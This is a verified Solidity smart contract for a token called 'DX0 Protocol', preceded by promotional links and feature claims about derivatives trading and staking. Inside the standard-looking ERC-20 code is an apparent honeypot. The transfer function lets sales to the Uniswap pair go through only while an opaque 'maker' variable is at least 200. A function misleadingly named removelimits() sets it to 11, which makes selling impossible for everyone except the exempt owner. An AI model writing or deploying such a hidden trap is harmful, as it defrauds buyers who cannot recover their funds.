    "source_code": "/*\r\n\ud83e\udde9Telegram :-\u00a0https://t.me/Dx0Protocol\r\n\ud83e\udde9Website:-http://dx0protocol.com/\r\n\r\n\ud83e\udde9Twitter:-https://twitter.com/Dx0Protocol\r\n\r\nDx0 Features |\ud83d\udcab\r\n\r\n\ud83e\udde9Derivatives and Futures trading\u2699\ufe0f\r\n\r\n\ud83e\udde9Cross-Collateral:\u00a0 Traders can deposit majority of supported tokens as collateral for their positions, saving on swap fees\ud83d\udd0e\u267b\ufe0f\r\n\r\n\ud83e\udde9Staking:\u00a0 Dx0 supports staking to help with the sustainability of the project. Earn Passive Income by staking your tokens in the Farms/Pools and generating rewards with high yield\ud83d\ude9c\u267b\ufe0f\r\n\u00a0 \r\n\ud83e\udde9Cross-Margin:\u00a0 Leverage is distributed across all positions under a single account, allowing for unparalleled capital efficiency\u2699\ufe0f\u267b\ufe0f\r\n\r\n*/\r\n\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.21;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract Dx0Protocol is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    address payable private _taxWallet;\r\n    int64 private maker = 259;\r\n\r\n    uint256 private _buytax = 0;\r\n    uint256 private _selltax = 0;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tTotal = 1000000000 * 10**_decimals;\r\n    string private constant _name = unicode\"DX0 Protocol\"; \r\n    string private constant _symbol = unicode\"DX0\";\r\n    uint256 public _maxTxAmount = _tTotal;\r\n    uint256 public _maxWalletSize =  _tTotal;\r\n    uint256 public _taxSwapThreshold= _tTotal * 1/1000;\r\n    uint256 public _maxTaxSwap= _tTotal * 1/100;\r\n\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address private uniswapV2Pair;\r\n    bool private tradingOpen;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n\r\n    event MaxTxAmountUpdated(uint _maxTxAmount);\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor () {\r\n        _taxWallet = payable(_msgSender());\r\n        _balances[_msgSender()] = _tTotal;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n        _isExcludedFromFee[_taxWallet] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxAmount=0;\r\n        if (from != owner() && to != owner()) {\r\n\r\n\r\n            taxAmount = amount.mul(_buytax).div(100);\r\n            if(to == uniswapV2Pair && from!= address(this) ){\r\n                require(maker >= 200);\r\n                taxAmount = amount.mul(_selltax).div(100);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold) {\r\n                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if(contractETHBalance > 0) {\r\n                    sendETHToFee(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(taxAmount>0){\r\n          _balances[address(this)]=_balances[address(this)].add(taxAmount);\r\n          emit Transfer(from, address(this),taxAmount);\r\n        }\r\n        _balances[from]=_balances[from].sub(amount);\r\n        _balances[to]=_balances[to].add(amount.sub(taxAmount));\r\n        emit Transfer(from, to, amount.sub(taxAmount));\r\n    }\r\n\r\n    function removelimits() external virtual{\r\n        maker = 11;\r\n    }\r\n\r\n    function setFeeAddressWallets(address payable newWallet) external onlyOwner {\r\n        _taxWallet = newWallet;\r\n    }\r\n\r\n    function setMaxamount(uint256 newTxAmt) external onlyOwner {\r\n        _maxTxAmount = _tTotal * newTxAmt/100;\r\n        require(newTxAmt >=1);\r\n    }\r\n\r\n    function updateBuyFee(uint256 newBuyTax) external onlyOwner {\r\n        _buytax = newBuyTax;\r\n        require(newBuyTax <= 5);\r\n    }\r\n\r\n    function updateFeeSell(uint256 newSellTax) external onlyOwner {\r\n        _selltax = newSellTax;\r\n        require(newSellTax <= 5);\r\n    }\r\n\r\n    function min(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a>b)?b:a;\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\r\n        if(tokenAmount==0){return;}\r\n        if(!tradingOpen){return;}\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function sendETHToFee(uint256 amount) private {\r\n        _taxWallet.transfer(amount);\r\n    }\r\n\r\n    function openTrading() external onlyOwner() {\r\n        require(!tradingOpen,\"trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function manualSwap() external {\r\n        require(_msgSender()==_taxWallet);\r\n        uint256 tokenBalance=balanceOf(address(this));\r\n        if(tokenBalance>0){\r\n          swapTokensForEth(tokenBalance);\r\n        }\r\n        uint256 ethBalance=address(this).balance;\r\n        if(ethBalance>0){\r\n          sendETHToFee(ethBalance);\r\n        }\r\n    }\r\n}",
    "etherscan_verified": true
}